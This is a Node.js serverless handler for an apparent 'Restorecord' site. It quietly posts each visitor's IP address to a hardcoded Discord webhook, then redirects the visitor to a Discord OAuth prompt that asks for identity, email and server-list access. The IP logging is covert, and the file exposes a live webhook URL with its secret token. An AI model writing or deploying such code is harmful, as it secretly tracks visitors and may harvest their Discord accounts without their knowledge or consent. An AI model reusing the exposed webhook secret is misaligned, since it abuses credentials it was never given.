const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

module.exports = async function handler(req, res) {
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress || "IP not found";

  const discordClientId = "1390626260056674366";
  const redirectUri = "https://restorecord-three.vercel.app/api/callback";
  const webhookURL = "https://discord.com/api/webhooks/1391119754780999730/r2DO9bmjrdv7EvHXKmwv7ICJtb_ZU68Az5JryR-tmPoqY_rcj_1-CMq3BFnIoRm3J82-";

  await fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{
        title: "New IP Visit",
        color: 0xffcc00,
        description: "```" + `IP Address: ${ip}` + "```",
        footer: { text: "Restorecord Logs" },
        timestamp: new Date().toISOString()
      }]
    }),
  }).catch(() => {});

  const discordOAuthUrl =
    `https://discord.com/oauth2/authorize?client_id=${discordClientId}` +
    `&redirect_uri=${encodeURIComponent(redirectUri)}` +
    `&response_type=code&scope=identify%20email%20guilds`;

  res.writeHead(302, { Location: discordOAuthUrl });
  res.end();
};
